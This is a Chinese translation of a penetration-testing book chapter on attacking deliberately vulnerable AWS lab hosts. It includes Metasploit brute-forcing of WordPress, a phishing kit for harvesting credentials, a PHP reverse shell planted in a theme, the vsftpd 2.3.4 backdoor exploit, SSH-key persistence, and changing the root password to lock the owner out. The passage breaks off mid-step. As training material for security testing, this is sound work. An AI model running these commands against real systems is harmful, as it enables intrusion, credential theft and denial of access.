# 第九章：*第九章*：使用 Metasploit 和更多工具进行真实渗透测试！

到目前为止，我们已经看过各种服务是如何设置的，以及我们如何修改和利用它们 - 同时也讨论了如何建议修复它们的简单解决方案。现在我们将会有相当大的进展，并将应用我们的渗透测试知识。我们将使用 AWS 和诸如 Metasploit 之类的工具来帮助我们利用 AWS 环境中的漏洞。本章将采用真实生活中的方式，来演示如何在真实世界的环境中进行 AWS 环境的渗透测试。

我们将进行一些基本的系统设置，模仿常见的漏洞，以及查看我们在之前章节中设置的一些镜像。我们将运行一些你可能会遇到的真实渗透测试场景，以及一些有趣的练习，教你一些新的策略和技术。我们将通过探索 Metasploit 中的一些 AWS 模块来结束本章，这些模块允许我们枚举敏感信息，从而导致进一步的攻击和权限提升。

把这一章看作是之前所有章节的“技术”顶峰。

在本章中，我们将涵盖以下主题：

+   使用 Metasploit 进行真实渗透测试

+   渗透测试前期准备

+   针对 WordPress 进行利用

+   针对易受攻击的服务应用

+   探索 AWS Metasploit 模块

# 技术要求

以下是本章的技术要求：

+   Metasploit

+   Nmap

+   WordPress

+   EC2 实例

+   虚拟私人云

+   Amazon Lightsail：[`aws.amazon.com/lightsail/`](https://aws.amazon.com/lightsail/)

+   钓鱼工具：[`github.com/xHak9x/SocialPhish`](https://github.com/xHak9x/SocialPhish)

查看以下视频，了解代码的实际操作：[`bit.ly/3kPcjNL`](https://bit.ly/3kPcjNL)

# 使用 Metasploit 进行真实渗透测试

在本书中，我们已经谈论了**Metasploit**相当多，并且甚至在 Metasploit 中使用了一些模块来帮助我们评估本书中的各种练习 - 但是，这些例子只是浅尝辄止，Metasploit 的真正潜力以及在云中进行渗透测试和道德黑客的潜力。

Metasploit 在渗透测试社区中有好坏参半的评价，因为它帮助自动化了我们的许多流程，可能被认为是廉价的或者是依赖自动化工具来进行渗透测试的新手。然而，作为一个以渗透测试为生的人，Metasploit 提供了巨大的优势，并自动化了许多无聊和简单的工作，同时让你专注于需要更多手动方法的评估的详细部分。在本章中，我们将看到如何利用 Metasploit，同时使用其他各种技术来帮助我们利用服务和系统。

重要提示

永远不要依赖一个工具来完成渗透测试工作。作为渗透测试人员，我们的工作是有效和高效地提供对真实攻击者的评估，同时评估目标组织的整体安全状况。

在本章中，我们将把我们从前面所有章节中学到的知识应用到我们的云环境中，使用你在实际渗透测试中可能遇到的真实场景。

我们将采取两种方法：

+   白盒/功能测试

+   没有黑盒测试的知识

## 什么是功能测试？

在我们开始之前，我想快速提一下功能测试是什么。它基本上和白盒测试是一样的；只是主要目标是确保环境中的应用和服务安全且正常运行，而渗透测试允许你寻找更多问题，并发现当某些东西没有正确或安全地运行时。

功能测试在云渗透测试中起着至关重要的作用，因为云渗透测试需要不同的方法。由于服务提供商方面的安全性非常发达，云环境中发现的大多数问题都源自用户的实施。我们已经亲眼见证了在*第四章*等章节中，过度宽松的政策会导致什么，以及这如何允许攻击者利用 S3 等服务。我们基本上是通过已经拥有凭证来评估我们的环境，应用了相同的方法论。

拥有凭证并寻找令人兴奋的资源和破损的政策使我们渗透测试人员能够在坏人之前发现问题。确保在进行 AWS 渗透测试时，渗透测试团队具有一些凭证访问权限，这将使他们能够高效地对 AWS 环境进行功能测试至关重要。

我们将在本章的最后看更多的功能测试，在*探索 AWS Metasploit 模块*部分。

## 黑盒测试

虽然我们在*第二章*中提到了**黑盒测试**，*渗透测试和道德黑客*，我想在这里再次简要提及它，因为我们将把它应用到本章的场景中。对于本章的场景来说，云的黑盒测试意味着我们对目标或其环境没有任何细节。然而，我们至少会知道目标主机的 DNS 或 IP 地址 - 这使我们能够节省时间并找到目标。

重要提示

黑盒测试有时可能是浪费时间，因为大部分测试时间都花在枚举信息上，因为渗透测试团队没有关于评估的任何先前知识。

这意味着渗透测试团队需要自己去找到进入应用程序和 AWS 云环境的方法。这包括钓鱼和暴力破解以找到 Web 应用程序和 AWS 环境的凭证，以及任何其他类型的社会工程。我们可以利用本书和本章中学到的策略来帮助我们访问本章中故意脆弱的系统。

现在我们已经了解了我们将要进行的测试类型，让我们开始朝着基于场景的测试迈进。在我们开始之前，我们需要确保一些事情有条不紊，并且在测试开始之前我们已经做好了准备。

# 渗透测试前期

在我们开始之前，我们需要确保我们的环境已经准备好进行渗透测试。这意味着我们需要确保我们的 AWS 网络已经设置好，并且我们使用的任何工具都已经更新。除了本书中的环境之外，始终重要的是要记住在进行渗透测试之前检查您的设置是否正确。如果您的设置没有准备好，您很可能会遇到问题，这将阻碍您进行成功的渗透测试；或者至少在渗透测试过程中会遇到一些挫折，这将耽误您的时间。

对于本节，让我们确保我们在正确的**虚拟私有云**（**VPC**）上，并且我们的目标已经配置好。这确保我们可以直接访问其私有网络上的机器，并且在尝试访问 AWS 环境的内部时不会遇到任何问题。我们还需要确保 Metasploit 已经更新，并且安装了最新的模块，以便我们可以使用它们来利用我们的目标。

## 重命名我们的 VPC 以便更清晰

让我们继续重命名我们的 VPC。请记住，VPC 充当我们正在使用的主机的虚拟私有云网络。我们一直在使用相同的 VPC 来设置主机；然而，我们从未重命名它，因为它与我们的目标和任务无关。

要重命名您的 VPC，请登录 AWS 控制台并按照以下步骤操作：

1.  在 AWS 控制台的主要搜索框中搜索`VPC`一词：![图 9.1-搜索 VPC](img/Figure_9.01_B15630.jpg)

图 9.1-搜索 VPC

1.  点击**VPCs**：![图 9.2-选择 VPC 选项](img/Figure_9.02_B15630.jpg)

图 9.2-选择 VPC 选项

1.  您将看到一个 VPC 列表。选择包含 Kali 实例的 VPC 并将其重命名。我们已经将我们的 VPC 重命名为**Pentest Playground**：

![图 9.3-重命名我们的 VPC](img/Figure_9.03_B15630.jpg)

图 9.3-重命名我们的 VPC

就是这样！我们现在已经重命名了我们的 VPC，这将使得以后的工作变得更加容易，因为我们可以自动将任何目标主机放在该 VPC 中。接下来，让我们继续更新我们的主要工具 Metasploit。

## 更新 Metasploit

在继续进行渗透测试之前，我们需要做最后一件事-我们需要更新我们 Kali Linux 机器上的 Metasploit。我们将使用托管在 AWS 中的 Kali 机器，因此请确保您已经启动并访问了该实例。要访问该机器，请使用以下命令：

```
$ ssh -i <key.pem> <public dns>
```

一旦您获得对 Kali 机器的访问权限，请继续输入以下命令来更新 Kali 主机中的 Metasploit 应用程序：

```
$ apt update; apt install metasploit-framework
```

让它运行一分钟并更新。完成后会提示您，然后可以继续。

现在我们的环境已经准备好了，是时候继续进行一些真正的渗透测试场景了。以下场景模拟了故意制造的易受攻击环境，模仿了真实环境中常见的问题。我们还将进行一些其他练习，使用 AWS 作为平台，以帮助提升您对渗透测试的了解，并展示 AWS 在渗透测试和攻击性安全方面的一些能力。

# 针对 WordPress 进行利用

对于我们的第一个渗透测试，我们将对一个名为 WordPress 的目标应用进行渗透测试，这是一个非常流行的用于博客和快速构建网站的网站。在渗透测试中，WordPress 网站成为目标并不罕见，因为它们非常灵活，而且非常简单易上手-正如我们将在下一刻看到的。如果您想了解更多关于 WordPress，请访问这里：[`wordpress.com/`](https://wordpress.com/)。

现在，让我们看看实际的情景是什么，以及我们被要求测试什么，以及如何测试。

重要提示

测试要求会因测试而异。有些目标可能只需要初始访问，而其他目标则需要完整的后期利用。这种情况完全取决于客户及其需求。

## 情景-获取未经授权的访问权限

在这种情况下，我们被要求针对一个 WordPress 网站进行攻击，并查看是否能够获得任何类型的访问权限。目标怀疑管理员很懒惰，并且已经实施了弱凭证来访问 Web 应用程序和后端主机。因此，根据目标的要求，这意味着我们需要访问 Web GUI 并通过反向 shell 访问主机系统。

我们可以通过几种不同的方法来做到这一点，比如蛮力攻击和社会工程学。我们将使用 Metasploit 并使用一个开源工具对目标进行网络钓鱼演习。在获得凭证后，我们将访问应用程序，并尝试通过在 Web 应用程序上放置后门来访问主机系统。

在进行渗透测试之前，我们需要首先搭建一个带有 WordPress 的 Web 服务器。我们可以使用一个名为**Lightsail**的服务来快速执行这个操作。

## 使用 Lightsail 设置目标

这一次在设置服务器时，我们将使用一种略有不同的方法。过去，我们使用 EC2 实例来配置主机和应用程序。现在，我们几乎要完全自动化整个过程，使用一个名为**Lightsail**的服务。

Lightsail 是 AWS 中的一个功能，允许我们在几分钟内构建应用程序。这对需要在几分钟内启动服务器和网站的管理员非常有效；然而，正如我们将在这个渗透测试场景中看到的那样，有时可能会出现一些常见问题。通常，简单的凭据和过度宽松的访问会打开脆弱的大门，使攻击者找到进入应用程序的方法！

现在，让我们先担心用 Lightsail 搭建我们的目标。如果您愿意，您可以在这里了解更多关于 Lightsail 的信息：[`aws.amazon.com/lightsail/`](https://aws.amazon.com/lightsail/)。

要开始，您需要登录到您的 AWS 帐户，网址是[aws.amazon.com](http://aws.amazon.com)。登录后，您可以在这里进入 Lightsail：[`lightsail.aws.amazon.com`](https://lightsail.aws.amazon.com)。

一旦您登录到 Lightsail 仪表板，您需要创建一个实例并配置它以适应我们易受攻击的目标场景。以下步骤将帮助您了解如何执行此操作：

1.  单击**创建实例**。

1.  选择**WordPress**应用程序，并在 Linux 镜像上构建它：![图 9.4 - 选择我们的 Lightsail 镜像，带有 WordPress 和 Linux](img/Figure_9.04_B15630.jpg)

图 9.4 - 选择我们的 Lightsail 镜像，带有 WordPress 和 Linux

1.  现在我们需要选择一个计划。选择**最便宜的计划**，可以免费使用一个月。您随时可以取消：![图 9.5 - 选择具有免费月份选项的计划，以避免收费](img/Figure_9.05_B15630.jpg)

图 9.5 - 选择具有免费月份选项的计划，以避免收费

1.  给您的实例命名！在这种情况下，我们将我们的实例命名为`WordPress-Metasploit`，以保持简单：![图 9.6 - 为熟悉性命名我们的实例](img/Figure_9.06_B15630.jpg)

图 9.6 - 为熟悉性命名我们的实例

1.  单击**创建实例**。

现在，我们应该有一个正在运行的仪表板与我们的新实例！

![图 9.7 - 我们在 Lightsail 中加载的实例](img/Figure_9.07_B15630.jpg)

图 9.7 - 我们在 Lightsail 中加载的实例

接下来，我们将使这个实例变得脆弱，以便我们可以攻击它。我们需要做的第一件事是登录并更改登录密码。当您到达 Lightsail 仪表板时，您会看到**使用 SSH 连接**。单击该按钮将为我们提供 WordPress 主机内的 SSH 终端。

让我们继续进行下一步，设置我们的易受攻击主机：

1.  单击**使用 SSH 连接**：![图 9.8 - 连接到主机系统](img/Figure_9.08_B15630.jpg)

图 9.8 - 连接到主机系统

1.  这将在您的浏览器中创建一个 SSH 窗口。在终端中键入`ls`以列出应用程序中的任何文件和目录：![图 9.9 - 列出主机中的文件](img/Figure_9.09_B15630.jpg)

图 9.9 - 列出主机中的文件

1.  使用`cat`命令列出应用程序密码文件！[](img/Figure_9.10_B15630.jpg)

图 9.10 - 列出密码文件的内容

1.  现在我们有了密码，让我们去登录地址，并使用密码和用户名登录到 Web 应用程序。登录地址将是`http://<publiciP>/wp-login.php`：![图 9.11 - 登录到我们的 WordPress 主机](img/Figure_9.11_B15630.jpg)

图 9.11 - 登录到我们的 WordPress 主机

1.  登录后，转到**用户**部分，然后单击**添加新用户**：![图 9.12 - 添加新用户](img/Figure_9.12_B15630.jpg)

图 9.12 - 添加新用户

1.  现在，继续创建一个名为`admin`的新用户，并将密码设置为`admin`：![图 9.13 - 创建管理员帐户](img/Figure_9.13_B15630.jpg)

图 9.13 - 创建管理员帐户

1.  创建用户后，您需要确保它是**管理员**角色组的一部分：

![图 9.14 - 将管理员角色分配给我们的管理员帐户](img/Figure_9.14_B15630.jpg)

图 9.14 - 将管理员角色分配给我们的管理员帐户

现在，我们的目标已经成功设置了一些容易受攻击的问题，这将使我们能够发现应用程序中的弱点。请记住，我们只是将应用程序设置为管理员，但我们是作为渗透测试人员对其进行攻击。这意味着我们知道应用程序的凭据。

让我们开始并开始渗透测试！

## 枚举目标

好了，现在舞台已经搭好，我们准备开始对目标进行渗透测试。我们需要做的第一件事是回到我们的 AWS Kali Linux 实例上。一旦你能够访问你的 Kali 主机，让我们开始扫描目标应用程序，看看我们发现了哪些端口和服务作为潜在的入口点：

```
$ nmap -Pn -sV <public DNS>
```

输出如下所示：

![图 9.15 - 扫描我们的 WordPress 主机](img/Figure_9.15_B15630.jpg)

图 9.15 - 扫描我们的 WordPress 主机

如你所见，打开的端口和服务是 web 服务端口和 SSH。由于我们只被要求测试 WordPress 应用程序，所以我们可以继续而不用担心 SSH，因为从技术上讲，它不在测试范围内。

重要提示

始终记住要在请求的渗透测试范围内活动。超出范围可能导致罚款、收入损失、信任丧失和诉讼。

现在我们知道我们可以访问端口`80`和`443`上的 web 端口，让我们开始向前迈进，看看我们可以从网站中使用 Metasploit 中的 WordPress 模块进行枚举。这是下一个逻辑步骤，因为我们已经知道目标正在托管 WordPress - 如果我们不知道，我们将首先尝试通过浏览器访问站点，看看 web 服务端口上运行的是什么应用程序。

以下命令将启动 Metasploit 并扫描我们的目标：

1.  启动 Metasploit：

```
$ msfdb run
```

下一个截图将让你看到 Metasploit 终端的外观：

![图 9.16 - 启动 Metasploit](img/Figure_9.16_B15630.jpg)

图 9.16 - 启动 Metasploit

1.  现在，我们需要继续选择 Metasploit 中的一个**扫描模块**，用于枚举**WordPress**的版本：

```
$ use auxiliary/scanner/http/wordpress_scanner
```

这将产生以下输出：

![图 9.17 - 发现 WordPress 5.3.4](img/Figure_9.17_B15630.jpg)

图 9.17 - 发现 WordPress 5.3.4

1.  看起来我们可能正在处理一个过时的**WordPress**版本。如果目标托管过时的应用程序，这些应用程序可能存在易受攻击和系统妥协的漏洞。现在，我们将查看与**5.3.4**相关的漏洞。你可以在这里找到与这个版本相关的漏洞：[`wpvulndb.com/wordpresses/53`](https://wpvulndb.com/wordpresses/53)。

我们没有找到任何突出的易受攻击的东西，所以现在我们可以继续看看是否可以通过手动枚举发现任何用户名。

要开始枚举用户名信息，我们需要去查看我们的 WordPress 应用程序的登录页面。我们将通过输入随机用户名开始评估，直到我们在用户名上找到一个精确匹配。这将允许我们使用已知的用户名和密码列表进行**暴力破解**，并且会花费更少的时间，因为我们只需要搜索密码，而不是用户名。

首先，转到`http://<public dns>/wp-login.php`的登录页面。一旦到达那里，开始使用一些常见的用户名来登录页面。在我们的情况下，我们将尝试使用`root`和`user`。

让我们开始吧：

1.  输入`root`作为用户名，`password`作为密码：![图 9.18 - 找不到用户名](img/Figure_9.18_B15630.jpg)

图 9.18 - 找不到用户名

如你所见，用户名未找到 - 这意味着这个用户名在这个应用程序中不存在。

1.  接下来，我们将尝试输入`user`作为用户名：![图 9.19 - 找到用户名](img/Figure_9.19_B15630.jpg)

图 9.19 - 找到用户名

现在我们可以看到我们已经找到了用户名，因为提示告诉我们`user`用户名是有效的，让我们看看如何使用 Metasploit 自动发现凭据。

1.  首先，您需要创建一个文件来放置用户名。如果我们找到更多的用户名，我们以后也可以使用这个文件。

继续将`user`打开到文件中：

```
vi Terminal and placing the word user within the file.![Figure 9.20 – Creating a file with user     ](img/Figure_9.20_B15630.jpg)Figure 9.20 – Creating a file with user 
```

1.  接下来，我们需要保存文件。键入`:wq`以保存并退出。

我们已经准备好使用我们的用户名文档；现在，我们只需要在目标主机上使用它。我们将再次依靠 Metasploit 来完成这项任务。Metasploit 有一个登录枚举模块，将帮助我们为我们发现的用户找到一些密码。一旦您启动了 Metasploit，请使用以下命令配置您的 Metasploit 模块以适应您的目标：

```
$ usemodules/auxiliary/scanner/http/wordpress_login_enum
$ set PASS_FILE /usr/share/wfuzz/wordlist/general/common.txt
$ set USER_FILE wordpressUsers.txt
$ set RHOSTS <target public dns>
$ run
```

请注意，在下一个截图中，我们找到了用户`user`：

![图 9.21–暴力破解和找到用户](img/Figure_9.21_B15630.jpg)

图 9.21–暴力破解和找到用户

正如您所看到的，我们找到了用户和密码。下一张截图突出显示密码是`admin`：

![图 9.22–发现密码](img/Figure_9.22_B15630.jpg)

图 9.22–发现密码

干得好！我们成功地收集了 WordPress 应用程序的凭据。虽然我们可以在这里停止枚举并继续尝试利用应用程序，但让我们采取另一种方法来获取其他凭据，以便让我们访问应用程序–毕竟，您拥有的凭据越多，越好！

接下来，我们将尝试通过使用开源网络钓鱼工具来获取更多的凭据。

## 收集凭据

本节的下一部分涉及向目标公司发送恶意链接，以尝试获取额外的凭据，从而使我们能够访问 Web 应用程序。**网络钓鱼**是一种涉及发送恶意电子邮件的**社会工程**攻击，试图模仿合法电子邮件。总体目标是让用户点击电子邮件或应用程序中的链接或下载，然后在目标上安装恶意软件或收集信息。在我们的情况下，我们将使用它来收集额外的凭据。

重要提示

在本练习中，我们不会向任何人发送虚假电子邮件。我们将假设已发送了一个非常描述性的电子邮件，并附有恶意链接。

要开始，我们需要获取一个名为**Social Phish**的程序，并将其放在我们的**AWS Kali 主机**上。要获取该应用程序，请使用以下命令：

```
$ git clone https://github.com/xHak9x/SocialPhish
```

在您的 Kali 机器上安装应用程序后，继续运行应用程序：

```
$ bash socialphish.sh
```

接下来，按照以下步骤执行攻击：

1.  现在应用程序正在运行，您需要确保选择**WordPress**模板：![图 9.23–设置我们的网络钓鱼应用程序](img/Figure_9.23_B15630.jpg)

图 9.23–设置我们的网络钓鱼应用程序

1.  在选择**WordPress**模板后，继续将**tinyURL**放入浏览器中。这将使用您的 Kali 主机的公共 DNS 进行访问：![图 9.24–来自网络钓鱼链接的假 WordPress 网站](img/Figure_9.24_B15630.jpg)

图 9.24–来自网络钓鱼链接的假 WordPress 网站

1.  正如您所看到的，我们看起来有一个正常的 WordPress 网站。我们可以欺骗用户将他们的凭据放入输入框中，从而窃取登录信息。继续使用 WordPress 应用程序的合法凭据：![图 9.25–发现的凭据](img/Figure_9.25_B15630.jpg)

图 9.25–发现的凭据

1.  在输入凭据后，您将在终端上收到登录信息，并且它将存储在系统上的文件中。

现在我们有了可以用来访问应用程序的凭据，让我们继续对 WordPress 应用程序进行更多的渗透测试，看看我们能做些什么。

## 获取 WordPress 的访问权限

这是评估中最短的部分。我们需要确保我们发现的凭据能够让我们访问网页。始终尝试你发现的凭据是很重要的，因为它们可能是**误报**的结果，或者在你尝试使用它们时已经被更改。

在我们的情况下，我们将返回到目标主机的登录页面，并使用我们发现的凭据：

![图 9.26 – WordPress 仪表板](img/Figure_9.26_B15630.jpg)

图 9.26 – WordPress 仪表板

如你所见，我们已成功访问了系统。既然我们已经获得了访问权限，让我们继续尝试利用应用程序并访问底层主机操作系统。

## 利用并获取反向 shell

现在是时候看看我们是否能在目标应用程序上获得**反向 shell**并**保持持久性**了。在一个易受攻击的 Web 应用程序上保持持久性向目标客户展示了他们的系统可以被*轻松*接管。此外，这也是一个更可怕的问题之一，因为它很难被检测到，并且允许未经授权的用户访问主机系统 - 这有时可能导致完全妥协。

要开始我们在目标上获取反向 shell 的旅程，我们需要找到一些可以注入或放置可执行代码的区域：

1.  首先，让我们去看看**主题编辑器**：![图 9.27 – WordPress 主题编辑器](img/Figure_9.27_B15630.jpg)

图 9.27 – WordPress 主题编辑器

1.  我们将有很多模板可供选择。让我们使用**404 模板**：

```
http://<public DNS>/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty
```

这可以如下所示：

![图 9.28 – 带有我们代码的 WordPress 主题编辑器](img/Figure_9.28_B15630.jpg)

图 9.28 – 带有我们代码的 WordPress 主题编辑器

1.  我们将以下代码放入模板中。设置`443`。此代码可以在此处找到：

[`github.com/PacktPublishing/AWS-Penetration-Testing/blob/master/Chapter%209:%20Real-Life%20Pentesting%20with%20Metasploit%20and%20More!/phpshell.php`](https://github.com/PacktPublishing/AWS-Penetration-Testing/blob/master/Chapter%209:%20Real-Life%20Pentesting%20with%20Metasploit%20and%20More!/phpshell.php)

1.  现在，我们需要在我们的 Kali Linux 主机上启动`netcat`来监听连接：

```
$ nc -lnvp 443
```

1.  现在我们需要尝试访问包含我们代码的完整 URL。我们可以使用`curl`命令来做到这一点：

```
$ curl http://<public dns>/wp-content/themes/twentytwenty/404.php
```

这将产生以下输出：

![图 9.29 – 来自我们目标主机的反向 shell](img/Figure_9.29_B15630.jpg)

图 9.29 – 来自我们目标主机的反向 shell

好的，所以我们使用了我们的精巧有效载荷获得了一个**Netcat** shell。然而，现在让我们通过获取一个**Meterpreter** shell 来简化事情！我个人觉得 Meterpreter shells 更令人愉悦，因为你可以在 Metasploit 中使用它们，并且它们具有典型 shell 所没有的额外功能。

要获得一个 Meterpreter shell，我们将在 Metasploit 中使用一个 WordPress 漏洞。我们将使用我们在评估中发现的凭据，以及我们的 AWS Kali Linux 主机来捕获传入的连接。

一旦你启动了 Metasploit，使用以下命令加载你的模块并配置它以针对主机：

```
$ use exploit/unix/webapp/wp_admin_shell_upload
$ set password admin
$ set username admin
$ set rhosts <Target Public DNS>
$ set lhost <AWS Kali Public DNS>
$ set lport 443
$ run
```

这将产生以下输出：

![图 9.30 – 来自我们目标主机的 Meterpreter 反向 shell](img/Figure_9.30_B15630.jpg)

图 9.30 – 来自我们目标主机的 Meterpreter 反向 shell

如你所见，我们已成功使用**Netcat** shell 和**Meterpreter** shell 获得了对主机操作系统的访问权限。从外观上看，这个应用程序相当不安全，并且几乎没有任何安全措施。现在我们已经完成了对这个应用程序的渗透测试，是时候继续讨论问题以及如何与他人讨论如何解决这些问题了。

## 讨论问题

一旦渗透测试结束，与目标讨论一些在渗透测试期间发现的问题是至关重要的。同样非常重要的是，避免使用可能会让非技术人员客户感到困惑的极其技术性的术语。让客户感到困惑或被技术术语压倒实际上可能会让客户离开，并且他们可能不会推荐你进行另一次渗透测试。

以下是我们将写给客户并附上渗透测试结果的声明：

在 WordPress 应用程序的渗透测试中，渗透测试人员成功地通过猜测和社会工程学提取了密码。社会工程包括向用户发送恶意链接，希望其中一些人会点击该链接并在看起来像客户网站的地方输入他们的凭据。

获得访问权限后，渗透测试人员继续前进，并在 Web 应用程序中放置了恶意代码，然后可以用来授予对目标服务器的未经授权访问。

建议客户培训其员工不要点击恶意链接，并且工程师不要为任何应用程序使用弱凭据。还建议审查密码策略，以防止未来创建简单的用户名和密码。如果您有任何问题，请告知，我们期待再次与您合作。

正如您所看到的，我们避免使用任何技术性术语，并建议如何解决问题。这让目标客户明白我们在这里是来帮助他们的，并且我们将与他们合作解决问题 – 最终巩固与客户业务的关系。

现在我们已经在 WordPress 黑客攻击中动手玩了一番，让我们来看看在评估 AWS 环境时可能遇到的一些不同问题。接下来，我们将开始研究如何发现托管在 EC2 上的易受攻击的应用程序。

# 针对易受攻击的服务应用程序

**易受攻击的服务**是环境中可能存在的最糟糕的问题之一，也是最容易修复的问题之一，*但并非总是最便宜的*。随着应用程序变老，构建应用程序所使用的代码也变老，而随着时间的推移，旧应用程序的漏洞也在增加。不幸的是，尽管简单地修补或更新旧软件听起来很容易，但实际上是非常昂贵和耗时的。更新应用程序可能需要大量时间，并且会使应用程序使用的服务停机。这意味着收入和可用性的损失。

在下一个场景中，我们将看到在 AWS 网络上易受攻击的应用程序造成的真正损害。

## 场景 – 发现和攻击任何易攻击的目标

在这种情况下，客户要求对他们怀疑存在易受攻击的应用程序进行渗透测试。该应用程序目前托管在其 AWS 环境中，并且可以从全球范围内的互联网公开访问。客户希望了解 Web 应用程序的易受攻击程度以及如果攻击者利用该应用程序并获得访问权限，会出现什么问题。

客户告诉我们，该应用程序用于文件存储，因此我们可以假设它很可能是某种类型的`21`。这就是我们将开始进行渗透测试的地方。

当然，在进行此操作之前，我们需要先设置环境。

## 使用社区 AMI 设置目标

要开始，我们需要转到 EC2 控制台，该控制台可以通过主 AWS 控制台访问。一旦您访问了 EC2 控制台，请点击**启动实例**，快速地启动一个易受攻击的实例：

1.  在选择**启动实例**后，让我们选择**vsftpd-2-3-4-final**社区 AMI：![图 9.31 – 启动我们的社区镜像](img/Figure_9.31_B15630.jpg)

图 9.31 – 启动我们的社区镜像

1.  你需要确保实例与其他正在运行的实例在同一个**VPC**中。我们将把它放在我们的**Pentest Playground** VPC 中。

1.  跳到最后，生成密钥对，并启动实例！

就这么简单，我们的实例已经准备就绪。但是，请给实例几分钟的时间来加载并分配地址，以便我们可以访问它。

接下来，我们将继续进行渗透测试，看看我们可以发现哪些潜在易受攻击的应用程序问题。

## 扫描打开的端口

一如既往，我们想要`21`，我们想要检查任何其他端口，以防我们忽视了某些东西。

在你的**AWS Kali**实例上启动**Metasploit**，并使用以下命令选择和配置模块来对我们的目标进行端口扫描：

```
$ use auxiliary/scanner/portscan/tcp
$ set rhosts ec2-54-189-99-52.us-west-2.compute.amazonaws.com
```

这将给我们以下输出：

![图 9.32 - 使用 Metasploit 扫描我们的主机的端口](img/Figure_9.32_B15630.jpg)

图 9.32 - 使用 Metasploit 扫描我们的主机的端口

正如你所看到的，我们在主机上打开了端口`22`和端口`21`。我们可以确认我们的怀疑，端口`21`确实是打开的。既然我们已经确认它是打开的，让我们继续收集有关端口`21`的更多信息。

## 对易受攻击的服务进行信息收集

继续前进，我们需要确定运行在端口`21`上的应用程序和版本号。为了帮助我们发现这一点，我们将使用`nmap`来扫描端口`21`并枚举该服务的版本：

```
$ nmap -sV -p21 ec2-54-189-99-52.us-west-2.compute.amazonaws.com
```

这将给我们以下输出：

![图 9.33 - 使用 Nmap 扫描我们的主机](img/Figure_9.33_B15630.jpg)

图 9.33 - 使用 Nmap 扫描我们的主机

我们现在知道了托管在目标主机上的文件服务的版本。正如你所看到的，`vsftpd 2.3.4`是系统上运行的应用程序的版本。让我们使用一个名为**SearchSploit**的程序来查看是否有我们可以针对我们的目标使用的任何漏洞利用：

```
$ searchsploit vsftpd 2.3.4
```

这将给我们以下输出：

![图 9.34 - 搜索漏洞](img/Figure_9.34_B15630.jpg)

图 9.34 - 搜索漏洞

看起来有一个**Metasploit**模块，我们可以用来利用我们的目标。我们现在有足够的信息来尝试利用我们的目标，希望能够访问目标系统。

## 使用 Metasploit 进行系统全面接管

有了关于目标的所有信息，让我们开始转变思路，进入攻击模式。要攻击应用程序，我们需要启动 Metasploit 并配置模块以适应当前目标：

```
$ use exploit/unix/ftp/vsftpd_234_backdoor
$ set rhosts <target host>
$ exploit
```

这给我们带来了以下输出：

![图 9.35 - 在目标主机上获取 root shell](img/Figure_9.35_B15630.jpg)

图 9.35 - 在目标主机上获取 root shell

正如你所看到的，我们有一个 root shell！这意味着我们完全控制了我们的目标，并可以对系统上的一切进行更改。然而，我们的 shell 可能需要在你的 shell 终端中再加一点“背景”。

现在我们回到了我们的 Metasploit 终端，让我们使用`shell_to_meterpreter`模块来升级我们当前的 shell。以下内容将为我们选择和配置这个模块：

```
$ use post/multi/manage/shell_to_meterpreter
$ set session 1
$ set lhost <public dns kali AWS>
$ exploit
```

你会看到以下输出：

![图 9.36 - 升级到 Meterpreter shell](img/Figure_9.36_B15630.jpg)

图 9.36 - 升级到 Meterpreter shell

正如你所看到的，我们现在有了`vsftpd`漏洞利用，第二个 shell 是我们新升级的 shell。要访问我们的新 Meterpreter shell，请使用以下命令：

```
$ session -i 2
```

太棒了 - 现在我们有了一个 Meterpreter shell，我们可以用它来利用环境中的更多潜在问题。让我们继续讨论并执行一些常见的方法，你可以成功地利用这个特定的主机进行更多的道德黑客乐趣。

## 后期利用和削弱其他服务

太好了，我们现在可以访问我们的系统了 - 想看看我们还能做什么吗？我们已经有了 root 访问权限，这意味着我们可以对我们的受攻击目标做几乎任何我们想做的事情。

在我们开始之前，让我们看看这个主机所在的网络。现在我们已经利用了它，我们都可以访问私有 AWS 网络，并可以使用**公共 IP**和**DNS**名称进行攻击。

重要提示

在一次真正的渗透测试中，您可以在私有 AWS 网络内部进行枢纽转移，并发现更多可能对公众不可访问的主机！

让我们继续在目标主机上运行`ifconfig`来查看我们的网络信息：

![图 9.37 – 从目标主机获取网络信息](img/Figure_9.37_B15630.jpg)

图 9.37 – 从目标主机获取网络信息

正如您所看到的，我们在`eth0`接口上找到了内部网络！虽然我们不会在这里进行任何枢纽转移，但重要的是要理解，从一个主机到另一个主机的枢纽转移是非常危险的 – 对系统来说是危险的。能够在网络内部进行枢纽转移而不被发现的黑客通常永远不会被抓住，并且可以在网络内部停留很长时间。重要的是要有日志记录和监控解决方案，以确保攻击者无法在网络中移动。

接下来，我们将在当前的**Meterpreter**会话中使用一个模块。我们将要使用的模块将为我们窃取 SSH 密钥，并基本上允许我们持久地访问系统。

让我们继续退出当前会话，输入`background`。接下来，加载并运行以下模块：

```
$ use post/linux/manage/sshkey_persistence
$ set session 2
$ run
```

这将给出以下输出：

![图 9.38 – 获取 SSH 公钥](img/Figure_9.38_B15630.jpg)

图 9.38 – 获取 SSH 公钥

现在我们可以利用这一点来实现持久性！将窃取的**SSH 密钥**复制到您的本地 Kali 机器上。然后，保存文件并更改权限：

```
$ chmod 400 vsftpd.pem
```

很好，现在权限都设置好了，我们可以继续进入我们的被黑客攻击的目标：

```
$ ssh -i vsftpd.pem root@ec2-54-245-170-97.us-west-2.compute.amazonaws.com
```

这将给出以下输出：

![图 9.39 – 以 root 身份 SSH 进入目标主机](img/Figure_9.39_B15630.jpg)

图 9.39 – 以 root 身份 SSH 进入目标主机

现在有一件事情，如果不被发现，会相当危险 – 让我们将密码更改为我们可以记住的内容，并且会拒绝客户端访问系统！

```
$ passwd root
```

您将看到以下输出：

![图 9.40 – 更改 root 账户的密码](img/Figure_9.40_B15630.jpg)

图 9.40 – 更改 root 账户的密码

现在，我们有一个密码可以使用，目标用户不知道。现在我们已经将密码更改为 root 账户，他们将无法以 root 级别访问它 – 这意味着我们完全控制了主机。

在结束这次渗透测试之前，我们将看一下具有公共访问权限的 EC2 实例也是内部网络的一部分的危险。在这种情况下，我们的利用主机到内部/私有网络的 IP 是`172.31.7.0/24`。我们可以使用`ifconfig`命令收集这些信息。请参考*图 9.37*进行说明。

要成功发现系统上的任何主机，我们需要在被利用的`vsftpd`服务器上安装 Nmap。安装和部署**Nmap**将允许我们扫描内部网络，查找任何在线主机 – 或者在我们的情况下，可以用来进一步利用的“目标”。

接下来，我们将在利用机器上运行以下命令来安装 Nmap：

```
